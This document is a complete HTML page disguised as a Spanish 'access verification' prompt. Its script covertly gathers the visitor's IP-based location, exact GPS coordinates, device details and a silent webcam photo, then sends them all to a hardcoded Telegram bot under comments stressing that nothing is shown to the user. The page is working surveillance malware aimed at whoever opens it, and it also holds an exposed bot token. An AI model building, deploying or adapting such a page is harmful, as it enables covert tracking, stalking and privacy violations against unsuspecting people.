<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de Acceso</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: black; color: white; }
        button { background: blue; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Verificación de Acceso</h1>
    <button id="btn">Verificar ahora</button>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // ⚠️ CAMBIA ESTO POR TU NUEVO TOKEN (revoca el viejo primero)
        const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
        const CHAT_ID = '7555997298'; // Tu Chat ID (no cambia)

        // Función para obtener IP y geolocalización por IP (fallback)
        async function getIPinfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    region: data.region,
                    city: data.city,
                    postal: data.postal,
                    timezone: data.timezone
                };
            } catch(e) { return null; }
        }

        // Función para obtener datos del dispositivo
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceModel = "Desconocido";
            if (ua.includes('iPhone')) deviceModel = 'iPhone';
            else if (ua.includes('iPad')) deviceModel = 'iPad';
            else if (ua.includes('Android')) deviceModel = 'Android';
            else if (ua.includes('Mac')) deviceModel = 'Mac';
            else if (ua.includes('Windows')) deviceModel = 'Windows PC';
            const language = navigator.language || navigator.userLanguage;
            const resolution = `${window.screen.width}x${window.screen.height}`;
            const cpuCores = navigator.hardwareConcurrency || 'Desconocido';
            return { deviceModel, ua, language, resolution, cpuCores };
        }

        // Enviar mensaje de texto a Telegram (sin feedback visual)
        async function sendMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        // Enviar foto
        async function sendPhoto(blob) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'photo.jpg');
            await fetch(url, { method: 'POST', body: fd });
        }

        // Capturar foto en silencio
        async function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                await new Promise(r => setTimeout(r, 500));
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                stream.getTracks().forEach(t => t.stop());
                return blob;
            } catch(e) {
                if (stream) stream.getTracks().forEach(t => t.stop());
                return null;
            }
        }

        // Acción del botón: todo en silencio
        document.getElementById('btn').onclick = async () => {
            const device = getDeviceInfo();
            let ipInfo = await getIPinfo();

            // GPS exacto (si se puede)
            let gpsCoords = null;
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    gpsCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
                } catch(e) { /* silencio */ }
            }

            // Construir mensaje detallado
            let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n`;
            message += `🖥️ *Device & Browser*\n`;
            message += `   • Device Model: ${device.deviceModel}\n`;
            message += `   • User Agent: ${device.ua}\n\n`;
            message += `🌐 *Network Information*\n`;
            message += `   • IP Address: ${ipInfo ? ipInfo.ip : 'No disponible'}\n`;
            message += `   • Language: ${device.language}\n\n`;
            message += `📍 *Location Details*\n`;
            if (gpsCoords) {
                message += `   • GPS Coordinates: ${gpsCoords.lat}, ${gpsCoords.lng}\n`;
                message += `   • Accuracy: ±${gpsCoords.accuracy} meters\n`;
                message += `   • Maps: https://www.google.com/maps?q=${gpsCoords.lat},${gpsCoords.lng}\n`;
            } else {
                message += `   • GPS: No disponible\n`;
                if (ipInfo && ipInfo.city) {
                    message += `   • Country: ${ipInfo.country}\n`;
                    message += `   • Region: ${ipInfo.region}\n`;
                    message += `   • City: ${ipInfo.city}\n`;
                    message += `   • Postal Code: ${ipInfo.postal}\n`;
                    message += `   • Timezone: ${ipInfo.timezone}\n`;
                }
            }
            message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
            message += `🔐 *Device Permissions*\n`;
            message += `   • Camera: ${await (navigator.mediaDevices ? 'Solicitado' : 'No soportado')}\n`;
            message += `   • Location: ${gpsCoords ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
            message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n`;
            message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n`;

            // Enviar datos sin mostrar nada al usuario
            await sendMessage(message);
            const foto = await capturePhoto();
            if (foto) await sendPhoto(foto);
        };
    </script>
</body>
</html>
